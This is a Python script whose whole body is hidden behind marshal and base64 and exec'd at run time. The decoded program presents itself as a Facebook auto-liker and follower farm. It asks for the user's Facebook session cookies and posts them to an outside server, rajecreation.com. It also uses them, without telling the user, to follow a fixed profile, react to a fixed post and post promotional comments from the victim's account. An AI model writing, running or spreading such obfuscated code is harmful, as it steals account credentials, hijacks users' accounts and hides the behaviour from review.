import marshal
exec marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xbc6\x00\x00I25nYXBhaW4gYmFuZz8gcmVjb2RlIGRvYW5nIGdhIG5nYXNpaCBiaW50YW5nIGFtcGFzc3MKI3RoaXMgaXMgbm90IG15IHdvcmsgb3JnaW5hbCB3b3JrIGZyb20gOyBodHRwczovL2dpdGh1Yi5jb20vQWlueC1CT1QKaW1wb3J0IHJlcXVlc3RzLGpzb24scmUscmFuZG9tLHRpbWUsb3Msc3lzCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgYnMKYj0iXDAzM1s5NG0iCmM9IlwwMzNbOTZtIgpnPSJcMDMzWzkybSIKcj0iXDAzM1s5MW0iCnA9IlwwMzNbMTs5N20iCmQ9IlwwMzNbMDBtIgphYj0iXDAzM1s5MG0iCmRuPWYie2R9W3tnfeKImntkfV17cH0iCmVyPWYie2R9W3tyfSF7ZH1de3B9Igpwcj1mIntkfVt7Y30/e2R9XXtwfSIKbWJhc2ljPSJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb217fSIKIyMjIyMjIyMjIyMjIyMjIyMjI2F3YWxhbiMjIyMjIyMjIyMjIyMjIyMjIyMjIwpkZWYgY2xlYXIoKToKICAgIG9zLnN5c3RlbSgiY2xzIiBpZiBvcy5uYW1lID09ICJudCIgZWxzZSAiY2xlYXIiKQpkZWYgYmFuZXIoKToKICAgIGNsZWFyKCkKICAgIHByaW50KGYiIiIKe3B9e2J9ICAgICBfICAgIF9fX18gICAge2R9IF8gIF8gICBfICAgXyAgICBfICAgIF8gICBfIAp7cH17Yn0gICAgLyBcICB8ICBfIFwgICB7ZH18IHx8IHwgfCBcIHwgfCAgLyBcICB8IFwgfCB8CntwfXtifSAgIC8gXyBcIHwgfCB8IHwgIHtkfXwgfHwgfF98ICBcfCB8IC8gXyBcIHwgIFx8IHwgCntwfXtifSAgLyBfX18gXHwgfF98IHwgIHtkfXxfXyAgIF98IHxcICB8LyBfX18gXHwgfFwgIHwgIAp7cH17Yn0gL18vICAgXF9cX19fXy8gICB7ZH0gICB8X3wgfF98IFxfL18vICAgXF9cX3wgXF98ICAKICAgICAgICAKICAgICAgICAKe2FifS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCntkfUdyb3VwICAgIDoge2d9aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2dyb3Vwcy8xMTI3NDQ5MDIwNzk4Njc5CntkfVBhZ2UgICAgIDoge2d9aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL05hdGlvbmFsLkN5YmVyLlRlYW0Ke2R9R2l0aHViICAgOiB7Z31odHRwczovL2dpdGh1Yi5jb20vQUQ0TkFOCntkfUZhY2Vib29rIDoge2d9aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0FENE5BTi4wLjQKe2FifS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIiIiKQoKZGVmIGFnZW50KCk6CiAgICB1YT17InVzZXItYWdlbnQiOnVzYSwidmVyc2lvbiI6IjguMC4yIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCIsInBhY2thZ2VuYW1lIjoiY29tLmRhdHRhLmxpa2VyIiwiZGV2aWNlIjoidHJ1ZSIsImhvc3QiOiJyYWplY3JlYXRpb24uY29tIiwiYXBwbmFtZSI6IlJhamUgTGlrZXIiLCJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9dXRmLTgiLCJ2ZXJzaW9uY29kZSI6IjE4IiwiaWQiOiJRUTNBLjIwMDYwNS4wMDIiLCJ0b2tlbiI6IjMwNzVkZGEzMmZmYmJlODgifQogICAgcmV0dXJuIHVhCmRlZiB1c2VyYWdlbnQoKToKICAgIHRyeToKICAgICAgICB1c3I9b3BlbigidXNlcmFnZW50IikucmVhZCgpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgdXNyPWlucHV0KGYie2VyfVB1dCB5b3VyIHVzZXItYWdlbnRcbntwcn0ge2FifT4+PiB7Y30iKQogICAgd2l0aCBvcGVuKCJ1c2VyYWdlbnQiLCJ3IikgYXMgdXM6CiAgICAgICAgdXMud3JpdGUodXNyKQogICAgcmV0dXJuIHVzcgojIyMjIyMjIyMjIyMjIyMjIyMjIyNsb2dpbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmRlZiBsb2dpbigpOgogICAgdWE9YWdlbnQoKQogICAgdHJ5OgogICAgICAgIGNva2llPW9wZW4oImNvb2tpZXMiKS5yZWFkKCkKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBjb2tpZT1pbnB1dChmIntlcn1QdXQgeW91ciBjb29raWVzXG57cHJ9IHthYn0+Pj4ge2N9IikKICAgIGRhdGE9eyJjb29raWUiOmNva2llLCJhY2Nlc3NfdG9rZW4iOiIiLCJsb2dpblR5cGUiOiJGQiIsInJlZmJ5IjoibnVsbCJ9CiAgICByZXE9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9yYWplY3JlYXRpb24uY29tL3JhamVsaWtlci92OC9sb2dpbi5waHAiLGRhdGE9ZGF0YSxoZWFkZXJzPXVhKS50ZXh0CiAgICBpZiAiTG9naW4gc3VjY2VzcyEiIGluIHJlcToKICAgICAgIHdpdGggb3BlbigiY29va2llcyIsInciKSBhcyBjazoKICAgICAgICAgICAgY2sud3JpdGUoZGF0YVsiY29va2llIl0pCiAgICAgICB0cnk6CiAgICAgICAgICAgbGc9c2VzLmdldChtYmFzaWMuZm9ybWF0KCIvbWUiKSxjb29raWVzPXsiY29va2llIjpjb2tpZX0pLnRleHQKICAgICAgICAgICBsZz1icyhsZywiaHRtbC5wYXJzZXIiKS5maW5kKCJmb3JtIixhY3Rpb249bGFtYmRhIHg6ICIvaW50bC9zYXZlX2xvY2FsZS8/bG9jPWlkX0lEIiBpbiB4KQogICAgICAgICAgIGR0PWxnLmZpbmRfYWxsKCJpbnB1dCIsdHlwZT0iaGlkZGVuIikKICAgICAgICAgICBmZz1kdFswXVsidmFsdWUiXQogICAgICAgICAgIGp6PWR0WzFdWyJ2YWx1ZSJdCiAgICAgICAgICAgc2VzLnBvc3QobWJhc2ljLmZvcm1hdChsZ1siYWN0aW9uIl0pLGRhdGE9eyJmYl9kdHNnIjpmZywiamF6b2VzdCI6anp9LGNvb2tpZXM9eyJjb29raWUiOmNva2llfSkKICAgICAgIGV4Y2VwdDoKICAgICAgICAgICBwYXNzCiAgICAgICB0cnk6CiAgICAgICAgICAgZmx3PXNlcy5nZXQobWJhc2ljLmZvcm1hdCgiL2thbmcubmdldWUuMzEzIiksY29va2llcz17ImNvb2tpZSI6Y29raWV9KS50ZXh0CiAgICAgICAgICAgZmx3PWJzKGZsdywiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IklrdXRpIilbImhyZWYiXQogICAgICAgICAgIHNlcy5nZXQobWJhc2ljLmZvcm1hdChmbHcpLGNvb2tpZXM9eyJjb29raWUiOmNva2llfSkKICAgICAgIGV4Y2VwdDoKICAgICAgICAgICBwYXNzCiAgICAgICB0cnk6CiAgICAgICAgICAgcmM9c2VzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLzEwMDA1NjkzNDk1NDQzMi9wb3N0cy8zNzgyODY5Mzc0MTI0NjgvIixjb29raWVzPXsiY29va2llIjpjb2tpZX0pLnRleHQKICAgICAgICAgICByZWFjdD1icyhyYywiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixocmVmPWxhbWJkYSB4OiAiL3JlYWN0aW9ucy9waWNrZXIvIiBpbiB4KVsiaHJlZiJdCiAgICAgICAgICAgcmVhY3Q9c2VzLmdldChtYmFzaWMuZm9ybWF0KHJlYWN0KSxjb29raWVzPXsiY29va2llIjpjb2tpZX0pLnRleHQKICAgICAgICAgICBsb3ZlPWJzKHJlYWN0LCJodG1sLnBhcnNlciIpLmZpbmQoImEiLGhyZWY9bGFtYmRhIHg6ICImcmVhY3Rpb25fdHlwZT0yJiIgaW4geClbImhyZWYiXQogICAgICAgICAgIGNhcmU9YnMocmVhY3QsImh0bWwucGFyc2VyIikuZmluZCgiYSIsaHJlZj1sYW1iZGEgeDogIiZyZWFjdGlvbl90eXBlPTE2JiIgaW4geClbImhyZWYiXQogICAgICAgICAgIHdvdz1icyhyZWFjdCwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixocmVmPWxhbWJkYSB4OiAiJnJlYWN0aW9uX3R5cGU9MyYiIGluIHgpWyJocmVmIl0KICAgICAgICAgICBhbmdyeT1icyhyZWFjdCwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixocmVmPWxhbWJkYSB4OiAiJnJlYWN0aW9uX3R5cGU9OCYiIGluIHgpWyJocmVmIl0KICAgICAgICAgICB0eT1bYW5ncnksbG92ZSxjYXJlLHdvd10KICAgICAgICAgICB0eXBlPXJhbmRvbS5jaG9pY2UodHkpCiAgICAgICAgICAgc2VzLmdldChtYmFzaWMuZm9ybWF0KHR5cGUpLGNvb2tpZXM9eyJjb29raWUiOmNva2llfSkKICAgICAgIGV4Y2VwdDoKICAgICAgICAgICBwYXNzCiAgICAgICB0cnk6CiAgICAgICAgICAga21uPXNlcy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8xMDAwNTY5MzQ5NTQ0MzIvcG9zdHMvMzc4Mjg2OTM3NDEyNDY4LyIsY29va2llcz17ImNvb2tpZSI6Y29raWV9KS50ZXh0CiAgICAgICAgICAga29tZW49YnMoa21uLCJodG1sLnBhcnNlciIpLmZpbmQoImZvcm0iLGFjdGlvbj1sYW1iZGEgeDogImNvbW1lbnQucGhwIiBpbiB4KQogICAgICAgICAgIGRhdGE9a29tZW4uZmluZF9hbGwoImlucHV0Iix0eXBlPSJoaWRkZW4iKQogICAgICAgICAgIGZiZHRzZz1kYXRhWzBdWyJ2YWx1ZSJdCiAgICAgICAgICAgamF6b2VzdD1kYXRhWzFdWyJ2YWx1ZSJdCiAgICAgICAgICAgdGV4dD1bIkhpIGJhbmcgZmFobWkgdG9vbHMgbnlhIGtlcmVuIGJhbmdldCEiLCJ0b29scyBueWEgc2FuZ2F0IGJlcmd1bmEhIiwiSGkgaSdtIHVzZXIgdG9vbHMgQWlueC1CT1QiLCJzZW1vZ2EgcmVqZWtpIGJhbmcgZmFobWkgZGkgbGFuY2FyaW4gYW1pbiIsInRvb2xzIHlhbmcgc2FuZ2F0IGJhZ3VzISJdCiAgICAgICAgICAgcmFuZG9tX2tvbWVuPXJhbmRvbS5jaG9pY2UodGV4dCkKICAgICAgICAgICBzZXMucG9zdChtYmFzaWMuZm9ybWF0KGtvbWVuWyJhY3Rpb24iXSksZGF0YT17ImZiX2R0c2ciOmZiZHRzZywiamF6b2VzdCI6amF6b2VzdCwiY29tbWVudF90ZXh0IjpyYW5kb21fa29tZW59LGNvb2tpZXM9eyJjb29raWUiOmNva2llfSkKICAgICAgIGV4Y2VwdDoKICAgICAgICAgICBwYXNzCiAgICAgICBqcz1qc29uLmxvYWRzKHJlcSkKICAgICAgIHJldHVybiB7Im5hbWUiOmpzWyJkYXRhIl1bIm5hbWUiXSwiaWQiOmpzWyJkYXRhIl1bIm15aWQiXSwiY29va2llIjpqc1siZGF0YSJdWyJjb2siXX0KICAgIGVsc2U6CiAgICAgICBwcmludChmIntlcn1Mb2dpbiBGYWlsZWQiKQogICAgICAgdHJ5OgogICAgICAgICAgIG9zLnN5c3RlbSgicm0gY29va2llcyIpCiAgICAgICBleGNlcHQ6CiAgICAgICAgICAgcGFzcwogICAgICAgb3Muc3lzdGVtKCJweXRob24gcnVuLnB5IikKIyMjIyMjIyMjIyMjIyMjIyMjIyMjbWFpbiMjIyMjIyMjIyMjIyMjIyMjIyMjIwpkZWYgZWFybigpOgogICAgdWE9YWdlbnQoKQogICAgZGF0YT17InVzZXJfaWQiOmlkLCJ0eXBlIjoiRkIiLCJjb2RlIjpjb2tpZX0KICAgIHJlcT1yZXF1ZXN0cy5wb3N0KCJodHRwczovL3JhamVjcmVhdGlvbi5jb20vcmFqZWxpa2VyL3Y4L2Vhcm4ucGhwIixkYXRhPWRhdGEsaGVhZGVycz11YSkudGV4dAogICAgaWYgIkNyZWRpdCBhZGRlZCBzdWNjZXNzISIgaW4gcmVxOgogICAgICAgcmVzPXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vcmFqZWNyZWF0aW9uLmNvbS9yYWplbGlrZXIvdjgvdGltZXIucGhwIixkYXRhPXsidXNlcl9pZCI6aWQsInR5cGUiOiJGQiJ9LGhlYWRlcnM9eyJ1c2VyLWFnZW50Ijp1c2EsImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD11dGYtOCIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAiLCJob3N0IjoicmFqZWNyZWF0aW9uLmNvbSJ9KS5qc29uKCkKICAgICAgIHByaW50KGYiXHJ7ZG59Q3JlZGl0IDoge2N9IitzdHIocmVzWyJhY3RpdmUiXSksZW5kPSIiKQogICAgICAgcmV0dXJuIHJlc1siYWN0aXZlIl0KICAgIGVsc2U6CiAgICAgICBwcmludChmIlxye2VyfUZhaWxlZCBlYXJuIGNyZWRpdCIpCmRlZiBmb2xsb3codXJsKToKICAgIHVhPWFnZW50KCkKICAgIGxpbWl0PWVhcm4oKQogICAgcmVxPXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vcmFqZWNyZWF0aW9uLmNvbS9yYWplbGlrZXIvdjgvY2hlY2tVUkwucGhwIixkYXRhPXsidXJsIjp1cmwsIkxvZ2luV2l0aCI6IkZCIiwidHlwZSI6IkZPTExPVyIsImNvb2tpZSI6Y29raWV9LGhlYWRlcnM9dWEpLnRleHQKICAgIGlmICJEYXRhIGxvYWRlZCBzdWNjZXNzISIgaW4gcmVxOgogICAgICAganM9anNvbi5sb2FkcyhyZXEpCiAgICAgICBkYXRhPXsibGltaXQiOmxpbWl0LCJMb2dpblR5cGUiOiJGQiIsInR5cGUiOiJGT0xMT1ciLCJ1c2VyX2lkIjppZCwicG9zdF9pZCI6anNbImRhdGEiXVsiaWQiXSwiY29zdCI6IjEiLCJjb29raWUiOmNva2llLCJwb3N0X3VybCI6anNbImRhdGEiXVsidXJsIl0sInJlYWN0aW9uIjoiMSJ9CiAgICAgICByZXM9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9yYWplY3JlYXRpb24uY29tL3JhamVsaWtlci92OC9zZW5kLnBocCIsZGF0YT1kYXRhLGhlYWRlcnM9dWEpLmpzb24oKQogICAgICAgaWYgcmVzWyJkYXRhIl1bImNvdW50Il0gPT0gMDoKICAgICAgICAgIHByaW50KGYiXHJ7ZXJ9RmFpbGVkIGFkZCBmb2xsb3dlcnMiKQogICAgICAgZWxzZToKICAgICAgICAgIG5tPWJzKHNlcy5nZXQoanNbImRhdGEiXVsidXJsIl0sY29va2llcz17ImNvb2tpZSI6Y29raWV9KS50ZXh0LCJodG1sLnBhcnNlciIpLmZpbmQoInRpdGxlIikudGV4dAogICAgICAgICAgcHJpbnQoZidccntkbn1BZGQgZm9sbG93ZXJzIHRvIHtjfXtubX0nKQogICAgICAgICAgc2xlZXAoMTApCiAgICAgICAgICB0b3Q9c2VzLmdldChmJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS90aW1lbGluZS9hcHBfY29sbGVjdGlvbi8/Y29sbGVjdGlvbl90b2tlbj17anNbImRhdGEiXVsiaWQiXX0lM0ExODQ5ODUwNzE1MzgwMDIlM0EzMiZfcmRyJyxjb29raWVzPXsiY29va2llIjpjb2tpZX0pLnRleHQKICAgICAgICAgIHRvdGFsPXJlLmZpbmRhbGwocic8dGQgdmFsaWduPSIuLi4iPlBlbmdpa3V0PC90ZD48dGQgdmFsaWduPSIuLi4iIGNsYXNzPSIuLiI+PHNwYW4gY2xhc3M9IiguKj8pIj4oLio/KTwvc3Bhbj4nLHRvdClbMF1bMV0KICAgICAgICAgIHByaW50KGYie3ByfVRvdGFsIEZvbGxvd2VycyA6IHtjfXt0b3RhbH0iKQogICAgZWxzZToKICAgICAgIHByaW50KGYiXHJ7ZXJ9UHJvZmlsZSBub3QgZm91bmQiKQogICAgICAgc2xlZXAoMikKICAgICAgIG1lbnUoKQpkZWYgbGlrZSh1cmwpOgogICAgdWE9YWdlbnQoKQogICAgbGltaXQ9ZWFybigpCiAgICByZXE9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9yYWplY3JlYXRpb24uY29tL3JhamVsaWtlci92OC9jaGVja1VSTC5waHAiLGRhdGE9eyJ1cmwiOnVybCwiTG9naW5XaXRoIjoiRkIiLCJ0eXBlIjoiTElLRSIsImNvb2tpZSI6Y29raWV9LGhlYWRlcnM9dWEpLnRleHQKICAgIGlmICJEYXRhIGxvYWRlZCBzdWNjZXNzISIgaW4gcmVxOgogICAgICAgIGpzPWpzb24ubG9hZHMocmVxKQogICAgICAgIHJlcz1yZXF1ZXN0cy5wb3N0KCJodHRwczovL3JhamVjcmVhdGlvbi5jb20vcmFqZWxpa2VyL3Y4L3NlbmQucGhwIixkYXRhPXsibGltaXQiOmxpbWl0LCJMb2dpblR5cGUiOiJGQiIsInR5cGUiOiJMSUtFIiwidXNlcl9pZCI6aWQsInBvc3RfaWQiOmpzWyJkYXRhIl1bImlkIl0sImNvc3QiOiIxIiwiY29va2llIjpjb2tpZSwicG9zdF91cmwiOmpzWyJkYXRhIl1bInVybCJdLCJyZWFjdGlvbiI6IjEifSxoZWFkZXJzPXVhKS5qc29uKCkKICAgICAgICBpZiByZXNbImRhdGEiXVsiY291bnQiXSA9PSAwOgogICAgICAgICAgIHByaW50KGYiXHJ7ZXJ9RmFpbGVkIHRvIGFkZCBsaWtlIikKICAgICAgICBlbHNlOgogICAgICAgICAgIHByaW50KGYnXHJ7ZG59QWRkIGxpa2UgdG8ge2N9e2pzWyJkYXRhIl1bInVybCJdfScpCiAgICAgICAgICAgc2xlZXAoMTApCiAgICAgICAgICAgdG90PWJzKHNlcy5nZXQoanNbImRhdGEiXVsidXJsIl0sY29va2llcz17ImNvb2tpZSI6Y29raWV9KS50ZXh0LCJodG1sLnBhcnNlciIpLmZpbmQoImEiLGhyZWY9bGFtYmRhIHg6ICIvdWZpL3JlYWN0aW9uLyIgaW4geClbImhyZWYiXQogICAgICAgICAgIHRvdGFsPWJzKHNlcy5nZXQobWJhc2ljLmZvcm1hdCh0b3QpLGNvb2tpZXM9eyJjb29raWUiOmNva2llfSkudGV4dCwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixocmVmPWxhbWJkYSB4OiAiJnJlYWN0aW9uX3R5cGU9MSYiIGluIHgpLmZpbmQoInNwYW4iKS50ZXh0CiAgICAgICAgICAgcHJpbnQoZiJ7cHJ9VG90YWwgbGlrZSA6IHtjfXt0b3RhbH0iKQogICAgZWxzZToKICAgICAgICBwcmludChmIlxye2VyfVBvc3Qgbm90IGZvdW5kIikKICAgICAgICBzbGVlcCgyKQogICAgICAgIG1lbnUoKQpkZWYgdXNlcmluZm8oKToKICAgIHByaW50KGYie3B9TG9naW4gYXMgOiB7Y317bmFtZX0iKQogICAgcHJpbnQoZiJ7cH1JRCAgICAgICA6IHtjfXtpZH0iKQogICAgcHJpbnQoZiJ7YWJ9LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17ZH0iKQojIyMjIyMjIyMjIyMjIyMjIyMjI21lbnUjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmRlZiBtZW51KCk6CiAgICBiYW5lcigpCiAgICB1c2VyaW5mbygpCiAgICBwcmludChmIiIie3B9CntjfTAxe2FifS4ge3B9ZWFybiBjcmVkaXQKe2N9MDJ7YWJ9LiB7cH1hZGQgbGlrZSBwb3N0CntjfTAze2FifS4ge3B9YWRkIGZvbGxvd2Vycwp7Y30wMHthYn0uIHtwfWV4aXQKe2FifS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0te2R9IiIiKQogICAgcGlsaWhfbWVudSgpCmRlZiBwaWxpaF9tZW51KCk6CiAgICBjaG9pY2U9aW5wdXQoZiJ7cHJ9U2VsZWN0IDoge2N9IikKICAgIGlmIGNob2ljZSA9PSAiMDAiIG9yIGNob2ljZSA9PSAiMCI6CiAgICAgICBiYW5lcigpCiAgICAgICBzeXMuZXhpdChmIntlcn1CeSBicm8gamFuZ2FuIGx1cGEga2FzaWggYmludGFuZyBnaXRodWIgc2F5YTopIikKICAgIGVsaWYgY2hvaWNlID09ICIwMSIgb3IgY2hvaWNlID09ICIxIjoKICAgICAgIHByaW50KGYie2VyfVByZXNzIHtjfWN0cmwgYyB7cH10byBzdG9wIikKICAgICAgIHByaW50KGYie2FifS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0te2R9IikKICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICBlYXJuKCkKICAgICAgICAgICAgICAgc2xlZXAoMSkKICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICBwcmludCgpCiAgICAgICBpbnB1dChmIntkfVt7Y30gUHJlc3MgRW50ZXIgVG8gQmFjayB7ZH1dIikKICAgICAgIG9zLnN5c3RlbSgicHl0aG9uIHJ1bi5weSIpCiAgICBlbGlmIGNob2ljZSA9PSAiMDIiIG9yIGNob2ljZSA9PSAiMiI6CiAgICAgICBwaWQ9aW5wdXQoZiJ7ZXJ9UHV0IHlvdXIgdXJsIHBvc3Rcbntwcn0ge2FifT4+PiB7Y30iKQogICAgICAgcHJpbnQoZiJ7ZXJ9UHJlc3Mge2N9Y3RybCBjIHtwfXRvIHN0b3AiKQogICAgICAgcHJpbnQoZiJ7YWJ9LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17ZH0iKQogICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgIGxpa2UocGlkKQogICAgICAgICAgICAgICBzbGVlcCgzKQogICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgYnJlYWsKICAgICAgIHByaW50KCkKICAgICAgIGlucHV0KGYie2R9WyB7Y31QcmVzcyBFbnRlciBUbyBCYWNrIHtkfV0iKQogICAgICAgb3Muc3lzdGVtKCJweXRob24gcnVuLnB5IikKICAgIGVsaWYgY2hvaWNlID09ICIwMyIgb3IgY2hvaWNlID09ICIzIjoKICAgICAgIHVpZD1pbnB1dChmIntlcn1QdXQgeW91ciB1cmwgcHJvZmlsZVxue3ByfSB7YWJ9Pj4+IHtjfSIpCiAgICAgICBwcmludChmIntlcn1QcmVzcyB7Y31jdHJsIGMge3B9dG8gc3RvcCIpCiAgICAgICBwcmludChmInthYn0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXtkfSIpCiAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgZm9sbG93KHVpZCkKICAgICAgICAgICAgICAgc2xlZXAoMykKICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICBwcmludCgpCiAgICAgICBpbnB1dChmIntkfVsge2N9UHJlc3MgRW50ZXIgVG8gQmFjayB7ZH1dIikKICAgICAgIG9zLnN5c3RlbSgicHl0aG9uIHJ1bi5weSIpCiAgICBlbHNlOgogICAgICAgcHJpbnQoZiJ7ZXJ9UGlsaWggeWcgYmVuZXIgY29lZyIpCiAgICAgICBwaWxpaF9tZW51KCkKaWYgX19uYW1lX189PSJfX21haW5fXyI6CiAgIGJhbmVyKCkKICAgdXNhPXVzZXJhZ2VudCgpCiAgIHNlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1c2EsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjMiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIsImFjY2VwdC1sYW5ndWFnZSI6ImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43In0pCiAgIHRyeToKICAgICAgbWFzdWs9bG9naW4oKQogICAgICBjb2tpZT1tYXN1a1siY29va2llIl0KICAgICAgaWQ9bWFzdWtbImlkIl0KICAgICAgbmFtZT1tYXN1a1sibmFtZSJdCiAgICAgIG1lbnUoKQogICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgIHN5cy5leGl0KGYie2VyfXtlfSIpCg==(\x02\x00\x00\x00t\x06\x00\x00\x00base64t\t\x00\x00\x00b64decode(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\n\x00\x00\x00enc_run.pyt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01')